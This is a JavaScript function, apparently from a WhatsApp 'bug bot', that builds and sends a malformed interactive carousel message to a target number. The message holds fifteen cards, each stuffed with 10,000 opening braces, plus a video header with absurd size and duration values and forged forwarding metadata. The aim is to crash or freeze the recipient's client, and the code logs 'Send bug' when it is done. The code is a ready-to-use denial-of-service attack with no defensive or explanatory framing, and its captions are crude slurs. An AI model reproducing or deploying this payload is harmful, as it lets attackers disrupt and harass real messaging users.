async function xforce(isTarget) {
  const cards = [];  
  const header = {
    videoMessage: {
      url: "https://mmg.whatsapp.net/v/t62.7161-24/13158969_599169879950168_4005798415047356712_n.enc?ccb=11-4&oh=01_Q5AaIXXq-Pnuk1MCiem_V_brVeomyllno4O7jixiKsUdMzWy&oe=68188C29&_nc_sid=5e03e0&mms3=true",
      mimetype: "video/mp4",
      fileSha256: "c8v71fhGCrfvudSnHxErIQ70A2O6NHho+gF7vDCa4yg=",
      fileLength: "109951162777600",
      seconds: 99999,
      mediaKey: "IPr7TiyaCXwVqrop2PQr8Iq2T4u7PuT7KCf2sYBiTlo=",
      caption: "kontol",
      height: 640,
      width: 640,
      fileEncSha256: "BqKqPuJgpjuNo21TwEShvY4amaIKEvi+wXdIidMtzOg=",
      directPath: "/v/t62.7161-24/13158969_599169879950168_4005798415047356712_n.enc?ccb=11-4&oh=01_Q5AaIXXq-Pnuk1MCiem_V_brVeomyllno4O7jixiKsUdMzWy&oe=68188C29&_nc_sid=5e03e0",
      mediaKeyTimestamp: "1743848703",
      streamingSidecar: "cbaMpE17LNVxkuCq/6/ZofAwLku1AEL48YU8VxPn1DOFYA7/KdVgQx+OFfG5OKdLKPM=",
      thumbnailDirectPath: "/v/t62.36147-24/11917688_1034491142075778_3936503580307762255_n.enc?ccb=11-4&oh=01_Q5AaIYrrcxxoPDk3n5xxyALN0DPbuOMm-HKK5RJGCpDHDeGq&oe=68185DEB&_nc_sid=5e03e0",
      thumbnailSha256: "QAQQTjDgYrbtyTHUYJq39qsTLzPrU2Qi9c9npEdTlD4=",
      thumbnailEncSha256: "fHnM2MvHNRI6xC7RnAldcyShGE5qiGI8UHy6ieNnT1k=",
      annotations: [{
        embeddedContent: {
          musicContentMediaId: "589608164114571",
          songId: "870166291800508",
          author: ".AditLonely", 
          title: "ZenithExecutoR",
          artworkDirectPath: "/v/t62.76458-24/11922545_2992069684280773_7385115562023490801_n.enc?ccb=11-4&oh=01_Q5AaIaShHzFrrQ6H7GzLKLFzY5Go9u85Zk0nGoqgTwkW2ozh&oe=6818647A&_nc_sid=5e03e0",
          artworkSha256: "u+1aGJf5tuFrZQlSrxES5fJTx+k0pi2dOg+UQzMUKpI=",
          artworkEncSha256: "iWv+EkeFzJ6WFbpSASSbK5MzajC+xZFDHPyPEQNHy7Q=",
          artistAttribution: "https://www.instagram.com/_u/adit6core_",
          countryBlocklist: true,
          isExplicit: true,
          artworkMediaKey: "S18+VRv7tkdoMMKDYSFYzcBx4NCM3wPbQh+md6sWzBU="
        },
        embeddedAction: true
      }]
    }, 
    hasMediaAttachment: false,
    contextInfo: {
      forwardingScore: 666,
      isForwarded: true,
      stanzaId: "sock-" + Date.now(),
      participant: "0@s.whatsapp.net",
      remoteJid: "status@broadcast",
      quotedMessage: {
        extendedTextMessage: {
          text: ".",
          contextInfo: {
            mentionedJid: ["13135550002@s.whatsapp.net"],
            externalAdReply: {
              title: "sock with Broadcast",
              body: "kontoll",
              thumbnailUrl: "",
              mediaType: 1,
              sourceUrl: "https://adit.example.com",
              showAdAttribution: false 
            }
          }
        }
      }
    }
  };

  for (let i = 0; i < 15; i++) {
    cards.push({
      header,
      nativeFlowMessage: {
        messageParamsJson: "{".repeat(10000)
      }
    });
  }

  const msg = generateWAMessageFromContent(isTarget, {
    viewOnceMessage: {
      message: {
        interactiveMessage: {
          body: {
            text: "pelerr",
          },
          carouselMessage: {
            cards,
            messageVersion: 1
          },
          contextInfo: {
            businessMessageForwardInfo: {
              businessOwnerJid: "13135550002@s.whatsapp.net"
            },
            stanzaId: "sock" + "-Id" + Math.floor(Math.random() * 99999), 
            forwardingScore: 100,
            isForwarded: true,
            mentionedJid: ["13135550002@s.whatsapp.net"], 
            externalAdReply: {
              title: "sock",
              body: "",
              thumbnailUrl: "https://example.com/",
              mediaType: 1,
              mediaUrl: "",
              sourceUrl: "https://zenith-ai.example.com",
              showAdAttribution: false
            }
          }
        }
      }
    }
  },{});

  await sock.relayMessage(isTarget, msg.message, {
    participant: { jid: isTarget },
    messageId: msg.key.id
  });
  console.log(chalk.blue('Send bug')) 
}